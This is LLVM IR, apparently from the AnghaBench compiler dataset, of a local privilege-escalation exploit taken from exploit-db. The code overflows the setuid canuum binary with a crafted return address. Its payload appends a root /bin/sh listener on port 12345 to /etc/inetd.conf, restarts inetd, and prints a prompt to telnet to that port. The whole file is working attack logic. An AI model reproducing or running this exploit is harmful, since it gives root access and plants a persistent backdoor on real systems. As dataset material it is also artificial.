; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_19583.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_19583.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MAXBUF = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i8] c"%s.c\00", align 1
@SHELL = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@fp = common dso_local global i32* null, align 8
@.str.2 = private unnamed_addr constant [21 x i8] c"Can not write to %s\0A\00", align 1
@.str.3 = private unnamed_addr constant [28 x i8] c"main(){setuid(0);setgid(0);\00", align 1
@.str.4 = private unnamed_addr constant [56 x i8] c"system(\22echo 12345 stream tcp nowait root /bin/sh sh -i\00", align 1
@.str.5 = private unnamed_addr constant [45 x i8] c" >> /etc/inetd.conf; killall -HUP inetd\22);}\0A\00", align 1
@.str.6 = private unnamed_addr constant [14 x i8] c"%s %s.c -o %s\00", align 1
@COMPILER = common dso_local global i8* null, align 8
@exec = common dso_local global i32 0, align 4
@JMP_OFS = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [24 x i8] c"Jumping address = %x\0A\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [61 x i8] c"Please execute following command after \22Segmentation Fault\22\0A\00", align 1
@.str.9 = private unnamed_addr constant [27 x i8] c"\0Atelnet localhost 12345\0A\0A\0A\00", align 1
@RETADR = common dso_local global i64 0, align 8
@.str.10 = private unnamed_addr constant [25 x i8] c"/usr/jp/canna/bin/canuum\00", align 1
@.str.11 = private unnamed_addr constant [7 x i8] c"canuum\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"-k\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i8*, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = load i32, i32* @MAXBUF, align 4
  %7 = add nsw i32 %6, 1
  %8 = zext i32 %7 to i64
  %9 = call i8* @llvm.stacksave()
  store i8* %9, i8** %1, align 8
  %10 = alloca i8, i64 %8, align 16
  store i64 %8, i64* %2, align 8
  %11 = load i8*, i8** @SHELL, align 8
  %12 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %10, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* %11)
  %13 = call i32* @fopen(i8* %10, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i32* %13, i32** @fp, align 8
  %14 = icmp eq i32* %13, null
  br i1 %14, label %15, label %18

15:                                               ; preds = %0
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0), i8* %10)
  %17 = call i32 @exit(i32 1) #4
  unreachable

18:                                               ; preds = %0
  %19 = load i32*, i32** @fp, align 8
  %20 = call i32 @fprintf(i32* %19, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.3, i64 0, i64 0))
  %21 = load i32*, i32** @fp, align 8
  %22 = call i32 @fprintf(i32* %21, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.4, i64 0, i64 0))
  %23 = load i32*, i32** @fp, align 8
  %24 = call i32 @fprintf(i32* %23, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.5, i64 0, i64 0))
  %25 = load i32*, i32** @fp, align 8
  %26 = call i32 @fclose(i32* %25)
  %27 = load i8*, i8** @COMPILER, align 8
  %28 = load i8*, i8** @SHELL, align 8
  %29 = load i8*, i8** @SHELL, align 8
  %30 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %10, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.6, i64 0, i64 0), i8* %27, i8* %28, i8* %29)
  %31 = call i32 @system(i8* %10)
  %32 = load i32, i32* @MAXBUF, align 4
  %33 = call i32 @memset(i8* %10, i8 signext 97, i32 %32)
  %34 = load i32, i32* @MAXBUF, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %10, i64 %35
  store i8 0, i8* %36, align 1
  %37 = load i32, i32* @exec, align 4
  %38 = load i8*, i8** @SHELL, align 8
  %39 = call i32 @strcat(i32 %37, i8* %38)
  %40 = getelementptr inbounds i8, i8* %10, i64 300
  %41 = load i32, i32* @exec, align 4
  %42 = load i32, i32* @exec, align 4
  %43 = call i32 @strlen(i32 %42)
  %44 = call i32 @memcpy(i8* %40, i32 %41, i32 %43)
  %45 = call i32 (...) @get_sp()
  store i32 %45, i32* %5, align 4
  %46 = load i32, i32* %5, align 4
  %47 = load i32, i32* @JMP_OFS, align 4
  %48 = add i32 %46, %47
  store i32 %48, i32* %4, align 4
  %49 = load i32, i32* %4, align 4
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.7, i64 0, i64 0), i32 %49)
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.8, i64 0, i64 0))
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.9, i64 0, i64 0))
  %53 = load i32, i32* %4, align 4
  %54 = and i32 %53, 255
  %55 = trunc i32 %54 to i8
  %56 = load i64, i64* @RETADR, align 8
  %57 = getelementptr inbounds i8, i8* %10, i64 %56
  store i8 %55, i8* %57, align 1
  %58 = load i32, i32* %4, align 4
  %59 = lshr i32 %58, 8
  %60 = and i32 %59, 255
  %61 = trunc i32 %60 to i8
  %62 = load i64, i64* @RETADR, align 8
  %63 = add i64 %62, 1
  %64 = getelementptr inbounds i8, i8* %10, i64 %63
  store i8 %61, i8* %64, align 1
  %65 = load i32, i32* %4, align 4
  %66 = lshr i32 %65, 16
  %67 = and i32 %66, 255
  %68 = trunc i32 %67 to i8
  %69 = load i64, i64* @RETADR, align 8
  %70 = add i64 %69, 2
  %71 = getelementptr inbounds i8, i8* %10, i64 %70
  store i8 %68, i8* %71, align 1
  %72 = load i32, i32* %4, align 4
  %73 = lshr i32 %72, 24
  %74 = and i32 %73, 255
  %75 = trunc i32 %74 to i8
  %76 = load i64, i64* @RETADR, align 8
  %77 = add i64 %76, 3
  %78 = getelementptr inbounds i8, i8* %10, i64 %77
  store i8 %75, i8* %78, align 1
  %79 = call i32 @execl(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.10, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i64 0, i64 0), i8* %10, i8* null)
  %80 = load i8*, i8** %1, align 8
  call void @llvm.stackrestore(i8* %80)
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, ...) #2

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @fprintf(i32*, i8*) #2

declare dso_local i32 @fclose(i32*) #2

declare dso_local i32 @system(i8*) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i32 @strcat(i32, i8*) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @get_sp(...) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
